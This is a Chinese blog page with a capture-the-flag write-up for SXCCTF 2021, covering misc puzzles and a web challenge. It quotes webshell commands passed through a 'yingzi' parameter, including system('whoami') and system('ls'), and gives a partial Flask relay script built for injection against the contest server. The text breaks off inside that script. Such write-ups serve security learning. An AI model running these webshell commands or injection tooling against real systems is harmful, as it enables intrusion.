@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SXCCTF 2021 | Mssn Harvey</title><meta name="keywords" content="SXCCTF"><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="签到 http:&#x2F;&#x2F;106.55.249.213:5002&#x2F;祝各位大佬，大大佬，新春快乐！2021 更加牛13！！！  flag在短片中：flag{Happy_New_Year_2021}  MiscFlag不在这 Flag真的不在这，你要相信我，知道吗！  打开显示 1Flag不在这！  于是放入010发现是个压缩包，打开发现flag.txt：flag{It’s_real_easy!D0_Y0u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SXCCTF 2021">
+<meta property="og:url" content="http://example.com/2021/02/21/2021SXCCTF/index.html">
+<meta property="og:site_name" content="Mssn Harvey">
+<meta property="og:description" content="签到 http:&#x2F;&#x2F;106.55.249.213:5002&#x2F;祝各位大佬，大大佬，新春快乐！2021 更加牛13！！！  flag在短片中：flag{Happy_New_Year_2021}  MiscFlag不在这 Flag真的不在这，你要相信我，知道吗！  打开显示 1Flag不在这！  于是放入010发现是个压缩包，打开发现flag.txt：flag{It’s_real_easy!D0_Y0u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/SXCTF2021.jpg">
+<meta property="article:published_time" content="2021-02-21T09:14:20.000Z">
+<meta property="article:modified_time" content="2021-03-18T06:16:26.306Z">
+<meta property="article:author" content="Harvey">
+<meta property="article:tag" content="SXCCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/SXCTF2021.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/02/21/2021SXCCTF/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-18 14:16:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友站</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/SXCTF2021.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mssn Harvey</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-archive"></i><span> 归档</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍清单</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影清单</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 评论</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友站</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SXCCTF 2021</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-21T09:14:20.000Z" title="发表于 2021-02-21 17:14:20">2021-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-18T06:16:26.306Z" title="更新于 2021-03-18 14:16:26">2021-03-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://106.55.249.213/">http://106.55.249.213</a>:5002/<br>祝各位大佬，大大佬，新春快乐！<br>2021 更加牛13！！！</p>
+</blockquote>
+<p>flag在短片中：flag{Happy_New_Year_2021}</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2208079998.png"></p>
+<h5 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h5><h2 id="Flag不在这"><a href="#Flag不在这" class="headerlink" title="Flag不在这"></a>Flag不在这</h2><blockquote>
+<p>Flag真的不在这，你要相信我，知道吗！</p>
+</blockquote>
+<p>打开显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag不在这！</span><br></pre></td></tr></table></figure>
+
+<p>于是放入010发现是个压缩包，打开发现flag.txt：flag{It’s_real_easy!D0_Y0u_Like_it?}</p>
+<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2526981304.png"></p>
+<h2 id="牛年大吉"><a href="#牛年大吉" class="headerlink" title="牛年大吉"></a>牛年大吉</h2><blockquote>
+<p>要相信自己，他就是flag！</p>
+</blockquote>
+<p>查看属性发现flag：flag{这个就是哦!}</p>
+<p><a target="_blank" rel="noopener" href="https://blog.harvey.plus/usr/uploads/2021/02/4097658638.png"><img src="https://blog.harvey.plus/usr/uploads/2021/02/4097658638.png" alt="img"></a></p>
+<h2 id="网络深处"><a href="#网络深处" class="headerlink" title="网络深处"></a>网络深处</h2><blockquote>
+<p>网络深处! 千万不要一个人大晚上做哦！！！</p>
+</blockquote>
+<p>原题就不写了.滑稽.jpg</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//blog.harvey.plus/index.php/Writeup/2020UNCTF-%E5%85%AC%E5%BC%80%E8%B5%9B.html#%E7%BD%91%E7%BB%9C%E6%B7%B1%E5%A4%841</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="拼图"><a href="#拼图" class="headerlink" title="拼图"></a>拼图</h2><blockquote>
+<p>你也喜欢鬼刀吗？</p>
+</blockquote>
+<p>montage合成 + gaps对大图遗传算法解拼图<br>①.<a target="_blank" rel="noopener" href="https://download.imagemagick.org/ImageMagick/download/binaries/ImageMagick-7.0.11-0-Q16-HDRI-x64-dll.exe">montage</a>（Windows）（PS：将其改为1200X1200）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage <span class="string">&quot;D:\Harvey\赛题\SXCCTF\杂项\zip\拼图\*.png&quot;</span> -tile <span class="number">10</span>x10 -geometry +<span class="number">0</span>+<span class="number">0</span> result.png</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.harvey.plus/usr/uploads/2021/02/3446728363.png"><img src="https://blog.harvey.plus/usr/uploads/2021/02/3446728363.png" alt="img"></a></p>
+<p>②.gaps（kali）解得flag：flag{123A4X5b6cLi}</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装命令</span><br><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/nemanja-m/gaps.git</span></span><br><span class="line">cd gaps</span><br><span class="line">sudo python3 setup.py install</span><br><span class="line">拼图命令</span><br><span class="line">gaps --image=/home/kali/Desktop/result.png --generation=<span class="number">30</span> --population=<span class="number">300</span> --size=<span class="number">120</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.harvey.plus/usr/uploads/2021/02/2116207182.png"><img src="https://blog.harvey.plus/usr/uploads/2021/02/2116207182.png" alt="img"></a></p>
+<h2 id="Very-very-easy-hex"><a href="#Very-very-easy-hex" class="headerlink" title="Very very easy hex"></a>Very very easy hex</h2><blockquote>
+<p>Very very easy hex!! Enjoy it!!!</p>
+</blockquote>
+<p>套娃解压缩包，先写个循环解压的脚本解出168张图<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2739945018.png"></p>
+<p>附上脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">zipname &#x3D; &quot;img.zip&quot;</span><br><span class="line">while True:</span><br><span class="line">    ts1 &#x3D; zipfile.ZipFile(zipname)</span><br><span class="line">    ts1.extractall(&quot;.&#x2F;&quot;)</span><br><span class="line">    zipname &#x3D; &quot;.&#x2F;&quot;+ts1.namelist()[0]</span><br></pre></td></tr></table></figure>
+
+<p>解法一：菜鸡做法</p>
+<p>接着发现这些图片hex就 04083A00 和 012040D0 两种格式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/116661158497.png"></p>
+<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2561853733.png"></p>
+<p>于是将其分别标注为0/1得到如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011001100110110001100001011001110111101101000100001100000101111101111001001100000111010101011111011011000110100101101011011001010101111101101001011101000011111101111101</span><br></pre></td></tr></table></figure>
+
+<p>最后转成字符串得到flag：flag{D0_y0u_like_it?}<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4286024290.png"></p>
+<p>解法二：大佬只需一个脚本梭哈QAQ</p>
+<p>跑下脚本得到flag：flag{D0_y0u_like_it?}</p>
+<p>附上脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">binstr&#x3D;&#39;&#39;</span><br><span class="line">for i in range(168):</span><br><span class="line">    img&#x3D;Image.open(str(i)+&#39;.png&#39;)</span><br><span class="line">    char&#x3D;img.getpixel((0,0))</span><br><span class="line">    if char&#x3D;&#x3D;(0, 0, 0, 255):</span><br><span class="line">        binstr+&#x3D;&#39;0&#39;</span><br><span class="line">    else:</span><br><span class="line">        binstr+&#x3D;&#39;1&#39;</span><br><span class="line">    if len(binstr)&gt;&#x3D;8:</span><br><span class="line">        print(chr(int(binstr,2)),end&#x3D;&#39;&#39;)</span><br><span class="line">        binstr&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h2><blockquote>
+<p>你会喜欢他的! :)</p>
+</blockquote>
+<p>原题by <a target="_blank" rel="noopener" href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020UNCTF#toc-heading-56">UNCTF2020-YLB绝密文件</a><br>不会复现.jpg</p>
+<h2 id="Love-it"><a href="#Love-it" class="headerlink" title="Love_it!"></a>Love_it!</h2><blockquote>
+<p>文件较大，选择网盘下载(手动狗头)<br>蓝奏：<a target="_blank" rel="noopener" href="https://wws.lanzous.com/iy5T6lf343g">https://wws.lanzous.com/iy5T6lf343g</a> 密码:gbmf<br>百度云：链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wT3bVls2X_5bOSBaxBK91A">https://pan.baidu.com/s/1wT3bVls2X_5bOSBaxBK91A</a> 提取码: ufrs 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
+<p>解压密码为：2021_jia_you!!<br>flag 为 flag{后台名称_后台账号_后台密码_一句话木马名称_一句话密码_第三个马子执行的命令}<br>例如：<br>后台网址为:<br><a target="_blank" rel="noopener" href="http://127.0.0.1/admin/index.php">http://127.0.0.1/admin/index.php</a> 后台名称就为: admin<br>账号为：2021 后台账号为: 2021<br>密码为：happy_new_year! 后台密码为: happy_new_year!<br>一句话木马路径为: <a target="_blank" rel="noopener" href="http://127.0.0.1/mu.php">http://127.0.0.1/mu.php</a> 一句话木马名称为: mu<br>一句话木马 一句话密码为: starsnow<br>一句话执行的命令<br>连接马子 之后执行的第三条 命令<br>第一条 yingzi=phpinfo();<br>第二条 yingzi=system(‘whoami’);<br>第三条 yingzi=system(‘ls’); 第三个马子执行的命令： system(‘ls’);</p>
+<p>例如：<br>flag{admin_2021_happy_new_year!_starsnow_system(‘ls’);}</p>
+</blockquote>
+<p>由题可知流量里面有传马<br>于是在筛选http下进行搜集题目所要求的信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">后台名：dede；后台账号：admin；密码：starsnowniubi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1628581112.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一句话木马名称：ma</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/945581305.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一句话密码：yingzi；第三个马子执行的命令：echo &#96;whoami&#96;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2893776143.png"><br>最终整合得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dede_admin_starsnowniubi_ma_yingzi_echo &#96;whoami&#96;;&#125;                  </span><br></pre></td></tr></table></figure>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><blockquote>
+<p>106.55.249.213:5001<br>BaseBaseBase<br>你遇见过渗透中传输值为加密的嘛？</p>
+</blockquote>
+<p>打开链接发现他还带有参数后面，再根据题目信息，于是我尝试了各种base，无果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;106.55.249.213:5001?user&#x3D;QgcAYAbgbw&#x2F;</span><br><span class="line"></span><br><span class="line">Sorry,you are not admin!you are Guest</span><br></pre></td></tr></table></figure>
+
+<p>最后试了试robots.txt发现了个base.txt</p>
+<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/985128690.png"></p>
+<p>接着将其保存下来，组合成一个字典得到admin=XAXwaAZAaQ</p>
+<p>附上脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">res&#x3D;&quot;&#123;&quot;</span><br><span class="line">with open(&quot;base.txt&quot;, &#39;r&#39;) as f:</span><br><span class="line">    a &#x3D; f.readlines()</span><br><span class="line">    for i in a:</span><br><span class="line">        tmp  &#x3D; i.strip(&quot;\n&quot;)</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;106.55.249.213:5001&#x2F;?user&#x3D;&#39;+tmp</span><br><span class="line">        # print(url)</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        z &#x3D; r.text[32:]</span><br><span class="line">        if z!&#x3D;&#39;&#39;:</span><br><span class="line">            k &#x3D; f&#39;&quot;&#123;z&#125;&quot;:&quot;&#123;tmp&#125;&quot;,&#39;</span><br><span class="line">        res +&#x3D; k</span><br><span class="line">res&#x3D;res[:-1]</span><br><span class="line">res+&#x3D;&quot;&#125;&quot;</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3344035626.png"></p>
+<p>经大佬指点得知需要整个flask脚本实现中转注入</p>
+<p>附上脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from flask import Flask,request</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">a &#x3D; &#123;&quot; &quot;: &quot;CA&quot;, &quot;!&quot;: &quot;HA&quot;, &quot;&quot;: &quot;HQ&quot;, &quot;#&quot;: &quot;Hg&quot;, &quot;$&quot;: &quot;Hw&quot;, &quot;%&quot;: &quot;IA&quot;, &quot;&amp;&quot;: &quot;IQ&quot;, &quot;&#39;&quot;: &quot;Ig&quot;, &quot;(&quot;: &quot;Iw&quot;, &quot;)&quot;: &quot;JA&quot;,</span><br><span class="line">     &quot;*&quot;: &quot;JQ&quot;, &quot;+&quot;: &quot;Jg&quot;, &quot;,&quot;: &quot;Jw&quot;, &quot;-&quot;: &quot;KA&quot;, &quot;.&quot;: &quot;KQ&quot;, &quot;&#x2F;&quot;: &quot;Kg&quot;, &quot;0&quot;: &quot;Kw&quot;, &quot;1&quot;: &quot;LA&quot;, &quot;2&quot;: &quot;LQ&quot;, &quot;3&quot;: &quot;Lg&quot;,</span><br><span class="line">     &quot;4&quot;: &quot;Lw&quot;, &quot;5&quot;: &quot;MA&quot;, &quot;6&quot;: &quot;MQ&quot;, &quot;7&quot;: &quot;Mg&quot;, &quot;8&quot;: &quot;Mw&quot;, &quot;9&quot;: &quot;NA&quot;, &quot;:&quot;: &quot;NQ&quot;, &quot;;&quot;: &quot;Ng&quot;, &quot;&lt;&quot;: &quot;Nw&quot;, &quot;&#x3D;&quot;: &quot;OA&quot;,</span><br><span class="line">     &quot;&gt;&quot;: &quot;OQ&quot;, &quot;?&quot;: &quot;Og&quot;, &quot;@&quot;: &quot;Ow&quot;, &quot;A&quot;: &quot;PA&quot;, &quot;B&quot;: &quot;PQ&quot;, &quot;C&quot;: &quot;Pg&quot;, &quot;D&quot;: &quot;Pw&quot;, &quot;E&quot;: &quot;QA&quot;, &quot;F&quot;: &quot;QQ&quot;, &quot;G&quot;: &quot;Qg&quot;,</span><br><span class="line">     &quot;H&quot;: &quot;Qw&quot;, &quot;I&quot;: &quot;RA&quot;, &quot;J&quot;: &quot;RQ&quot;, &quot;K&quot;: &quot;Rg&quot;, &quot;L&quot;: &quot;Rw&quot;, &quot;M&quot;: &quot;SA&quot;, &quot;N&quot;: &quot;SQ&quot;, &quot;O&quot;: &quot;Sg&quot;, &quot;P&quot;: &quot;Sw&quot;, &quot;Q&quot;: &quot;TA&quot;,</span><br><span class="line">     &quot;R&quot;: &quot;TQ&quot;, &quot;S&quot;: &quot;Tg&quot;, &quot;T&quot;: &quot;Tw&quot;, &quot;U&quot;: &quot;UA&quot;, &quot;V&quot;: &quot;UQ&quot;, &quot;W&quot;: &quot;Ug&quot;, &quot;X&quot;: &quot;Uw&quot;, &quot;Y&quot;: &quot;VA&quot;, &quot;Z&quot;: &quot;VQ&quot;, &quot;[&quot;: &quot;Vg&quot;,</span><br><span class="line">     &quot;\\&quot;: &quot;Vw&quot;, &quot;]&quot;: &quot;WA&quot;, &quot;^&quot;: &quot;WQ&quot;, &quot;_&quot;: &quot;Wg&quot;, &quot;&#96;&quot;: &quot;Ww&quot;, &quot;a&quot;: &quot;XA&quot;, &quot;b&quot;: &quot;XQ&quot;, &quot;c&quot;: &quot;Xg&quot;, &quot;d&quot;: &quot;Xw&quot;, &quot;e&quot;: &quot;YA&quot;,</span><br><span class="line">     &quot;f&quot;: &quot;YQ&quot;, &quot;g&quot;: &quot;Yg&quot;, &quot;h&quot;: &quot;Yw&quot;, &quot;i&quot;: &quot;ZA&quot;, &quot;j&quot;: &quot;ZQ&quot;, &quot;k&quot;: &quot;Zg&quot;, &quot;l&quot;: &quot;Zw&quot;, &quot;m&quot;: &quot;aA&quot;, &quot;n&quot;: &quot;aQ&quot;, &quot;o&quot;: &quot;ag&quot;,</span><br><span class="line">     &quot;p&quot;: &quot;aw&quot;, &quot;q&quot;: &quot;bA&quot;, &quot;r&quot;: &quot;bQ&quot;, &quot;s&quot;: &quot;bg&quot;, &quot;t&quot;: &quot;bw&quot;, &quot;u&quot;: &quot;cA&quot;, &quot;v&quot;: &quot;cQ&quot;, &quot;w&quot;: &quot;cg&quot;, &quot;x&quot;: &quot;cw&quot;, &quot;y&quot;: &quot;dA&quot;,</span><br><span class="line">     &quot;z&quot;: &quot;dQ&quot;, &quot;&#123;&quot;: &quot;dg&quot;, &quot;|&quot;: &quot;dw&quot;, &quot;&#125;&quot;: &quot;eA&quot;, &quot;~&quot;: &quot;eQ&quot;, &quot;&quot;: &quot;eg&quot;, &quot;聙&quot;: &quot;ew&quot;, &quot;聛&quot;: &quot;fA&quot;, &quot;聜&quot;: &quot;fQ&quot;, &quot;聝&quot;: &quot;fg&quot;,</span><br><span class="line">     &quot;聞&quot;: &quot;fw&quot;, &quot;聟&quot;: &quot;gA&quot;, &quot;聠&quot;: &quot;gQ&quot;, &quot;聡&quot;: &quot;gg&quot;, &quot;聢&quot;: &quot;gw&quot;, &quot;聣&quot;: &quot;hA&quot;, &quot;聤&quot;: &quot;hQ&quot;, &quot;聥&quot;: &quot;hg&quot;, &quot;聦&quot;: &quot;hw&quot;, &quot;聧&quot;: &quot;iA&quot;,</span><br><span class="line">     &quot;聨&quot;: &quot;iQ&quot;, &quot;聫&quot;: &quot;ig&quot;, &quot;聬&quot;: &quot;iw&quot;, &quot;聭&quot;: &quot;jA&quot;, &quot;聮&quot;: &quot;jQ&quot;, &quot;聯&quot;: &quot;jg&quot;, 